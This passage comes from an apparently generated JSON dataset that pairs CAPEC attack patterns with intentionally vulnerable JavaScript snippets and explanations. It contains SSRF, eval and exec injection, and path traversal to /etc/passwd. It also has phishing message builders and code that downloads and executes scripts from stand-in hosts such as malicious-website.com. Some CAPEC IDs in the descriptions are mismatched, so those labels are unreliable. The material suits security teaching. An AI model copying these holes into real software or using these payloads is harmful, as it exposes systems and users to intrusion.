        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No target URL specified');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error fetching target URL');\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and fetches data from a target URL specified in the query parameters. The code demonstrates several vulnerabilities related to the CAPEC 'Infrastructure Manipulation' and associated CWEs:\n\n1. **Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)**: The server fetches data from any URL specified by the user without verifying the endpoint, allowing an attacker to redirect traffic to a malicious server.\n\n2. **Incorrectly Specified Destination in a Communication Channel (CWE-941)**: The target URL is taken directly from user input without validation, which can lead to incorrect or malicious destinations.\n\n3. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: The code does not verify the integrity of the data received from the target URL, making it susceptible to tampering during transmission.\n\n4. **Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497)**: The server may inadvertently expose sensitive information by fetching and displaying data from untrusted sources.\n\nThis code represents the main idea of the CAPEC by demonstrating how an attacker can manipulate the routing of network messages to redirect traffic to a server under their control, potentially leading to information theft or further attacks."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n  <form action=\"/purchase\" method=\"POST\">\n    <input type=\"hidden\" name=\"item_id\" value=\"12345\">\n    <input type=\"hidden\" name=\"price\" value=\"100\">\n    <input type=\"hidden\" name=\"quantity\" value=\"1\">\n    <input type=\"submit\" value=\"Buy Now\">\n  </form>\n  <script>\n    // Simulating an attacker modifying the hidden fields\n    document.querySelector('input[name=\"price\"]').value = '10';\n    document.querySelector('input[name=\"quantity\"]').value = '10';\n  </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet represents a vulnerable web form where hidden fields are used to store sensitive information such as price and quantity. The form is intended to submit a purchase request to the server. However, an attacker can manipulate these hidden fields using client-side JavaScript before the form is submitted. In this example, the attacker changes the price from 100 to 10 and the quantity from 1 to 10, exploiting the server's reliance on client-side data for critical security decisions. This demonstrates the CAPEC concept of 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "const trustedDomain = 'https://trusted.example.com';\nconst userEmail = 'user@example.com';\n\nfunction sendPhishingEmail(targetEmail) {\n  const phishingLink = `https://phishing.example.com?redirect=${encodeURIComponent(trustedDomain)}`;\n  const emailContent = `Dear user,\\n\\nWe noticed unusual activity on your account. Please verify your information by clicking the link below:\\n\\n<a href=\"${phishingLink}\">Verify Now</a>\\n\\nThank you,\\nTrusted Support Team`;\n  console.log(`Sending email to ${targetEmail}:\\n${emailContent}`);\n}\n\nsendPhishingEmail(userEmail);",
        "description": "This JavaScript code snippet simulates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted entity and contains a link that redirects the user to a malicious site. The link uses URL redirection (CWE-601) to make it look like it leads to a trusted domain. The email content is crafted to appear legitimate and relevant to the user, increasing the likelihood of the user clicking the link. This embodies the main idea of CAPEC-163 (Spear Phishing) by targeting a specific user with a deceptive email."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "const sendPhishingSMS = (phoneNumber) => {\n  const phishingLink = 'http://malicious-site.com/login';\n  const message = `Dear user, your account has been compromised. Please login immediately to secure it: ${phishingLink}`;\n  sendSMS(phoneNumber, message);\n};\n\nconst sendSMS = (phoneNumber, message) => {\n  // Simulate sending an SMS message\n  console.log(`Sending SMS to ${phoneNumber}: ${message}`);\n};\n\n// Example usage\nsendPhishingSMS('+1234567890');",
        "description": "This JavaScript code snippet simulates a mobile phishing attack by sending a phishing SMS message to a specified phone number. The `sendPhishingSMS` function constructs a message containing a malicious link and sends it to the user via the `sendSMS` function. This embodies the main idea of the CAPEC by demonstrating how an adversary might initiate a phishing attack through SMS. The code also indirectly highlights related CWEs, such as UI misrepresentation (CWE-451) by using a deceptive message, and the potential for authentication bypass (CWE-290) if the user falls for the phishing attempt and enters their credentials on the malicious site."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  const basePath = '/var/www/app/uploads/';\n  const filePath = path.join(basePath, userInput);\n\n  // CWE-22: Path Traversal vulnerability\n  if (!filePath.startsWith(basePath)) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-73: External Control of File Name or Path\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('../../etc/passwd');",
        "description": "This JavaScript code snippet demonstrates a file manipulation vulnerability by allowing user input to control the file path used in a filesystem operation. The `readFile` function takes user input to construct a file path, which is then used to read the file's contents. The code attempts to prevent path traversal attacks (CWE-22) by checking if the constructed file path starts with a base directory. However, this check is insufficient and can be bypassed. Additionally, the code allows external control of the file name or path (CWE-73), which can lead to reading unintended files. This snippet embodies the main idea of the CAPEC by showing how improper handling of file paths and names can lead to incorrect processing and potential security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "const systemConfig = {\n  securityLevel: 'high',\n  accessControl: true\n};\n\nfunction resetSystemConfig() {\n  // Missing authentication for critical function (CWE-306)\n  systemConfig.securityLevel = 'low';\n  systemConfig.accessControl = false;\n  console.log('System configuration has been reset to default values.');\n}\n\n// Simulate a power state transition\nfunction powerStateTransition() {\n  // Improper lock behavior after power state transition (CWE-1232)\n  resetSystemConfig();\n}\n\n// Simulate an attacker forcing a reset\npowerStateTransition();\nconsole.log(systemConfig);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can force the system to reset its configuration to insecure default values. The `resetSystemConfig` function resets critical security settings without any authentication (CWE-306). The `powerStateTransition` function simulates a power state transition that improperly allows the system configuration to be reset (CWE-1232). This embodies the CAPEC idea of forcing the system into a previous state to exploit weaknesses in the target's configuration."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "const sensitiveData = 'SecretKey123';\n\nfunction logSensitiveData() {\n    console.log('Sensitive Data:', sensitiveData);\n}\n\nfunction debugMode() {\n    if (process.env.DEBUG === 'true') {\n        logSensitiveData();\n    }\n}\n\ndebugMode();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data ('SecretKey123') is exposed through a debug mode. The `logSensitiveData` function logs the sensitive data to the console, and the `debugMode` function checks an environment variable to determine if it should run in debug mode. If the `DEBUG` environment variable is set to 'true', the sensitive data is logged. This represents the CAPEC concept of White Box Reverse Engineering, where an attacker could analyze the code and discover the sensitive data. The related CWEs are illustrated by the improper management of sensitive data (CWE-1323), exposure of sensitive information (CWE-497), and the potential for debug logic to be activated at runtime (CWE-1313)."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create an alternate data stream\nfunction createADS(filePath, streamName, data) {\n  const adsPath = `${filePath}:${streamName}`;\n  fs.writeFileSync(adsPath, data);\n}\n\n// Function to read an alternate data stream\nfunction readADS(filePath, streamName) {\n  const adsPath = `${filePath}:${streamName}`;\n  return fs.readFileSync(adsPath, 'utf8');\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\nfs.writeFileSync(filePath, 'This is the main file content.');\n\n// Create an ADS\ncreateADS(filePath, 'hiddenStream', 'This is hidden data in ADS.');\n\n// Read the ADS\nconst hiddenData = readADS(filePath, 'hiddenStream');\nconsole.log('Hidden Data:', hiddenData);",
        "description": "This JavaScript code snippet demonstrates the creation and reading of an Alternate Data Stream (ADS) in a file on an NTFS file system. The `createADS` function attaches hidden data to a file using the ADS feature, while the `readADS` function retrieves this hidden data. The example usage shows how to create a file, attach hidden data to it, and then read the hidden data. This embodies the main idea of CAPEC-212, where an attacker can exploit ADS to hide malicious data or tools in a file without being detected by standard file system utilities. The code also touches on related CWEs, such as improper handling of ADS (CWE-69) and improper removal of sensitive information (CWE-212), by demonstrating how data can be hidden and potentially mishandled."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Admin Panel');\n  } else if (req.url === '/user') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('User Dashboard');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server that listens on port 8080. The server responds differently based on the URL requested. If the URL is '/admin', it returns 'Admin Panel'; if the URL is '/user', it returns 'User Dashboard'; otherwise, it returns 'Not Found'. This code snippet embodies the concept of 'Footprinting' (CAPEC) by allowing an adversary to probe the server and discover the existence of different endpoints. The code also demonstrates CWE-205 (Observable Behavioral Discrepancy) as it reveals different responses based on the URL, which can be used by an attacker to infer the presence of certain resources. Additionally, it touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the existence of an admin panel to unauthorized users."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/?query=sensitiveData',\n  method: 'GET',\n  headers: {\n    'User-Agent': 'Mozilla/5.0'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response Headers:', res.headers);\n    console.log('Response Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to a web application, which is a common technique used in web application fingerprinting. The code sends a request to 'example.com' with a query string that includes sensitive data. The response headers and body are logged to the console, which can reveal information about the server, such as software versions, error messages, and other sensitive details. This aligns with CWE-598 (Use of GET Request Method With Sensitive Query Strings) and CWE-209 (Generation of Error Message Containing Sensitive Information). The code represents the main idea of CAPEC-170 (Web Application Fingerprinting) by showing how an attacker might probe a web application to gather information that could be used for further attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "const userInput = 'userControlledVariable';\nconst dynamicVarName = eval(userInput);\n\nlet globalVar = 'safeValue';\n\nfunction manipulateVariable() {\n  eval(dynamicVarName + ' = \"maliciousValue\"');\n}\n\nmanipulateVariable();\nconsole.log(globalVar);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically determine the name of a variable using the 'eval' function, which is a dangerous practice (CWE-95: Eval Injection). The 'manipulateVariable' function then uses 'eval' again to assign a new value to the dynamically named variable. This can lead to an attacker manipulating global variables or other critical variables (CWE-914: Improper Control of Dynamically-Identified Variables). The 'globalVar' is declared with a wide scope (CWE-1126: Declaration of Variable with Unnecessarily Wide Scope), making it susceptible to unauthorized modifications. The code snippet highlights the risks of using dynamic variable names and 'eval', which can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var hiddenFrame = document.createElement('iframe');\n  hiddenFrame.style.display = 'none';\n  hiddenFrame.src = 'http://malicious-site.com/download';\n  document.body.appendChild(hiddenFrame);\n});",
        "description": "This JavaScript code snippet demonstrates an action spoofing attack. When a user clicks on a button with the ID 'submitButton', they expect to submit a form or perform a benign action. However, the code instead creates a hidden iframe that initiates a download from a malicious site. This embodies the concept of action spoofing by disguising a harmful action as a benign one. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by misleading the user about the action they are performing, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by directing the user to an unintended, malicious destination."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "const flashVars = new URLSearchParams(window.location.search);\nconst flashParam = flashVars.get('flashParam');\n\nif (flashParam) {\n  const flashObject = document.createElement('embed');\n  flashObject.setAttribute('src', 'vulnerable.swf');\n  flashObject.setAttribute('flashvars', `param=${flashParam}`);\n  document.body.appendChild(flashObject);\n}\n\n// CWE-88: Argument Injection\nconst command = `someCommand --option ${flashParam}`;\nexec(command);\n\n// CWE-942: Permissive Cross-domain Policy\nconst crossDomainPolicy = `<?xml version=\"1.0\"?>\n<!DOCTYPE cross-domain-policy SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\">\n<cross-domain-policy>\n  <allow-access-from domain=\"*\" />\n</cross-domain-policy>`;\ndocument.write(crossDomainPolicy);\n\n// CWE-433: Unparsed Raw Web Content Delivery\nconst rawContent = '<script>alert(\"XSS\")</script>';\ndocument.write(rawContent);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nconst fileInput = document.createElement('input');\nfileInput.type = 'file';\nfileInput.accept = '*/*';\ndocument.body.appendChild(fileInput);\n\n// CWE-1336: Improper Neutralization in Template Engine\nconst template = `Hello, ${flashParam}`;\ndocument.write(template);",
        "description": "This JavaScript code snippet demonstrates a Flash Parameter Injection vulnerability by improperly validating user input from the URL parameters and injecting it into a Flash file embedded within an HTML document. The code also illustrates several related CWEs: CWE-88 (Argument Injection) by constructing a command string with user input, CWE-942 (Permissive Cross-domain Policy) by writing a permissive cross-domain policy, CWE-433 (Unparsed Raw Web Content Delivery) by writing raw content directly to the document, CWE-434 (Unrestricted Upload of File with Dangerous Type) by allowing any file type to be uploaded, and CWE-1336 (Improper Neutralization in Template Engine) by inserting user input into a template without proper neutralization."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const scriptUrl = queryObject.script;\n\n  if (scriptUrl) {\n    try {\n      const script = require(scriptUrl);\n      script.execute();\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error loading script');\n    }\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No script URL provided');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL query parameters to extract a 'script' parameter, which is then used in a require statement to dynamically load and execute a script. This embodies the main idea of CAPEC-242 (Code Inclusion) by allowing arbitrary code to be retrieved and executed based on user input. The code is vulnerable to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports executable functionality from an untrusted source. It also touches on CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program) by not properly validating the input used in the require statement, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not restricting the dynamically loaded script."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Path to the configuration file\nconst configFilePath = '/path/to/config.json';\n\n// Function to read and parse the configuration file\nfunction readConfig() {\n  try {\n    const configData = fs.readFileSync(configFilePath, 'utf8');\n    const config = JSON.parse(configData);\n    return config;\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n    return null;\n  }\n}\n\n// Function to modify a configuration setting\nfunction modifyConfig(setting, value) {\n  const config = readConfig();\n  if (config) {\n    config[setting] = value;\n    try {\n      fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2), 'utf8');\n      console.log('Configuration updated successfully');\n    } catch (err) {\n      console.error('Error writing configuration file:', err);\n    }\n  }\n}\n\n// Example usage: Modify a configuration setting\nmodifyConfig('debugMode', true);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to 'Configuration/Environment Manipulation' (CAPEC-15). The code reads and modifies an external configuration file (config.json). The 'modifyConfig' function allows changing configuration settings, such as enabling 'debugMode'. This represents CWE-15 (External Control of System or Configuration Setting) as it allows external control over the application's configuration. If an attacker gains access to this script or the configuration file, they could manipulate the application's behavior, potentially enabling debug modes or other insecure settings, leading to security risks."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configName) {\n  const directories = ['/etc/app/', './config/'];\n  let configPath;\n\n  for (const dir of directories) {\n    const potentialPath = path.join(dir, configName);\n    if (fs.existsSync(potentialPath)) {\n      configPath = potentialPath;\n      break;\n    }\n  }\n\n  if (!configPath) {\n    throw new Error('Configuration file not found');\n  }\n\n  const config = fs.readFileSync(configPath, 'utf8');\n  return JSON.parse(config);\n}\n\n// Example usage\ntry {\n  const config = loadConfig('appConfig.json');\n  console.log('Config loaded:', config);\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker can exploit the file location algorithm to load a malicious configuration file. The `loadConfig` function attempts to load a configuration file by searching through a list of directories. If an attacker places a malicious file named 'appConfig.json' in the './config/' directory, it will be loaded instead of the legitimate file in '/etc/app/'. This embodies the CAPEC idea of creating files with the same name as protected files and placing them in directories that are searched first. The related CWEs are represented by the reliance on file names (CWE-646), external control of file paths (CWE-73), and incorrect resolution of file names (CWE-706)."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "const flashUrl = 'http://trusted-site.com/flash.swf?redirect=' + encodeURIComponent(window.location.href);\nconst iframe = document.createElement('iframe');\niframe.src = flashUrl;\ndocument.body.appendChild(iframe);",
        "description": "This JavaScript code snippet demonstrates a potential Cross-Site Flashing vulnerability. The code constructs a URL to a Flash file hosted on a trusted site, appending the current page's URL as a parameter. This URL is then set as the source of an iframe, which is added to the document body. If the Flash file on the trusted site uses the 'redirect' parameter to load external content, an attacker could manipulate this parameter to execute arbitrary content. This snippet embodies the main idea of CAPEC-58 by showing how an attacker can exploit Flash functionality through URL parameters. The related CWEs provide additional context, such as the risk of open redirects (CWE-601), permissive cross-domain policies (CWE-942), and improper neutralization of input (CWE-79, CWE-644)."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "const sensitiveData = 'user=admin&password=secret';\n\n// Vulnerable: Using GET request with sensitive data in query string\nfetch(`https://example.com/api/getUserData?${sensitiveData}`, {\n  method: 'GET'\n})\n.then(response => response.json())\n.then(data => {\n  console.log(data);\n})\n.catch(error => console.error('Error:', error));\n\n// Vulnerable: Storing sensitive data in a persistent cookie\ndocument.cookie = `sessionToken=abc123; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/`;\n\n// Vulnerable: Exposing micro-service endpoint directly\nfetch('https://example.com/api/microservice')\n.then(response => response.text())\n.then(data => {\n  document.getElementById('content').innerHTML = data;\n})\n.catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly' and the associated CWEs. The code includes:\n1. Using a GET request with sensitive data in the query string (CWE-598), which can expose sensitive information in URLs.\n2. Storing sensitive data in a persistent cookie (CWE-539), which can be accessed by attackers if they gain access to the user's cookies.\n3. Directly exposing a micro-service endpoint (CAPEC), which can be discovered and exploited by attackers to gather information about the micro-service's implementation and function.\nThese vulnerabilities highlight the risks of improper handling of sensitive data and direct exposure of micro-services, which can lead to further exploitation by attackers."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Incorrectly configured access control: sensitive route without proper access control\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Correctly configured access control\napp.get('/secure-data', isAuthenticated, (req, res) => {\n  res.send('This is secure data');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates an Express.js application with a middleware function to check if a user is authenticated. The '/admin' route is an example of incorrectly configured access control, as it does not use the 'isAuthenticated' middleware, allowing unauthorized access to sensitive functionality. The '/secure-data' route correctly uses the 'isAuthenticated' middleware to ensure only authenticated users can access it. This snippet embodies the main idea of CAPEC by showing how an attacker could exploit incorrectly configured access controls to gain unauthorized access, and it also highlights CWE-732 (Incorrect Permission Assignment for Critical Resource) by showing the importance of proper permission checks."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "<html>\n<head>\n  <style>\n    #overlay {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      z-index: 10;\n      opacity: 0;\n    }\n  </style>\n</head>\n<body>\n  <div id=\"overlay\">\n    <object type=\"application/x-shockwave-flash\" data=\"malicious.swf\" width=\"100%\" height=\"100%\"></object>\n  </div>\n  <iframe src=\"https://trusted-site.com\" width=\"100%\" height=\"100%\" style=\"z-index: 1;\"></iframe>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Flash File Overlay attack, where a transparent Flash object is placed over a legitimate website using an iframe. The Flash object captures user interactions, such as clicks, and can perform actions without the user's knowledge. The overlay is styled to be transparent and positioned above the iframe content. This attack exploits CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the Flash object to intercept user actions intended for the underlying iframe. Additionally, it can be related to CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) if the Flash object is loaded from an untrusted domain, and CWE-434 (Unrestricted Upload of File with Dangerous Type) if the Flash file is uploaded without proper validation."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(url) {\n  var flashObject = document.createElement('object');\n  flashObject.data = url;\n  document.body.appendChild(flashObject);\n}\n\n// Example usage\nvar userProvidedUrl = 'http://example.com/flash.swf';\nloadFlashContent(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of loading Flash content based on user-provided input. The function `loadFlashContent` takes a URL as an argument and creates an `object` element to load Flash content from the specified URL. The URL is directly taken from user input without any validation, making it susceptible to Flash Injection attacks. An attacker can exploit this by providing a malicious URL that points to a Flash file containing harmful code. This example embodies the main idea of the CAPEC 'Flash Injection' and highlights related CWEs such as 'Improper Input Validation' (CWE-20) and 'Permissive Cross-domain Policy with Untrusted Domains' (CWE-942)."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst net = require('net');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const imapCommand = queryObject.command;\n\n  // Vulnerable: Directly using user input in IMAP command without sanitization\n  const client = net.createConnection({ port: 143, host: 'localhost' }, () => {\n    client.write(`${imapCommand}\\r\\n`);\n  });\n\n  client.on('data', (data) => {\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(data.toString());\n  });\n\n  client.on('error', (err) => {\n    res.writeHead(500, { 'Content-Type': 'text/plain' });\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web-mail server that directly forwards user-supplied IMAP commands to a back-end IMAP server without proper sanitization. The web server listens for HTTP requests, extracts the 'command' parameter from the query string, and sends it directly to the IMAP server. This lack of input validation and sanitization can lead to IMAP/SMTP command injection attacks. The code also includes error handling that could potentially expose sensitive information if not properly managed. This example embodies the main idea of CAPEC-IMAP/SMTP Command Injection and highlights related CWEs such as improper neutralization of special elements (CWE-77), improper encoding or escaping of output (CWE-116), and exposure of information through error messages (CWE-535, CWE-209)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious-code.js', (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download code');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('downloaded-code.js', data, (err) => {\n      if (err) {\n        console.error('Failed to save code');\n        return;\n      }\n      console.log('Code downloaded and saved. Executing...');\n      require('./downloaded-code.js');\n    });\n  });\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a software integrity attack by downloading and executing code from a remote location without verifying its integrity. The code uses the 'http' module to fetch a JavaScript file from a specified URL and saves it to the local filesystem using the 'fs' module. Once saved, the code is executed using 'require'. This snippet embodies CWE-494 (Download of Code Without Integrity Check) as it does not verify the origin or integrity of the downloaded code, making it susceptible to malicious code injection (CWE-506). The lack of integrity checks and proper validation can lead to the execution of potentially harmful code, undermining the software's integrity and security."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://malicious-website.com/malware.js', (res) => {\n  if (res.statusCode === 200) {\n    let file = fs.createWriteStream('malware.js');\n    res.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      require('./malware.js'); // Execute the downloaded code without integrity check\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a 'Malicious Software Download' attack. It uses the 'http' module to download a JavaScript file from a remote location and the 'fs' module to save it locally. Once the file is downloaded, it is executed without any integrity check, which embodies CWE-494 ('Download of Code Without Integrity Check'). This code could potentially contain embedded malicious code (CWE-506), act as a Trojan horse (CWE-507), or replicate malicious code (CWE-509). The code snippet represents the main idea of CAPEC-160 by showing how an attacker can deceive a user or an automated process into downloading and executing dangerous code from an attacker-controlled source."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst downloadAndUpdate = (url, dest) => {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        console.log('Update downloaded and installed.');\n        require(dest); // Execute the downloaded file\n      });\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n};\n\ndownloadAndUpdate('http://malicious.example.com/update.js', 'update.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a file from a specified URL and executes it without verifying the origin or integrity of the code. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or system into downloading and running malicious code. The code also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check) by not verifying the downloaded file, CWE-506 (Embedded Malicious Code) by potentially executing harmful code, and CWE-507 (Trojan Horse) by hiding malicious functionality within what appears to be a legitimate update."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst updateUrl = 'http://malicious-server.com/update';\n\nhttp.get(updateUrl, (res) => {\n  if (res.statusCode !== 200) {\n    console.error('Failed to download update');\n    return;\n  }\n\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('/path/to/update', data, (err) => {\n      if (err) {\n        console.error('Failed to write update');\n        return;\n      }\n      console.log('Update applied successfully');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading update:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The code downloads an update from a specified URL and writes it to a file without performing any integrity checks or authentication of the source. This embodies the CAPEC 'Malicious Automated Software Update via Redirection' by showing how an attacker could exploit the lack of proper server authentication and integrity validation to introduce malicious code. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the absence of any verification of the downloaded data; CWE-294 (Authentication Bypass by Capture-replay) is implied by the lack of secure authentication mechanisms; CWE-602 (Client-Side Enforcement of Server-Side Security) is represented by the client handling security-critical operations; CWE-506 (Embedded Malicious Code) is the potential result of this vulnerability; and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is shown by the untrusted update URL being used without validation."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nfunction encrypt(data) {\n  const cipher = crypto.createCipher('des', 'weakpassword');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Exposing sensitive system information (CWE-497)\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// Undocumented feature (CWE-1242)\nfunction undocumentedFeature() {\n  console.log('This is an undocumented feature!');\n}\n\n// Main function demonstrating reverse engineering vulnerability\nfunction main() {\n  const sensitiveData = 'Sensitive Information';\n  const encryptedData = encrypt(sensitiveData);\n  console.log('Encrypted Data:', encryptedData);\n  console.log('System Info:', getSystemInfo());\n  undocumentedFeature();\n}\n\nmain();",
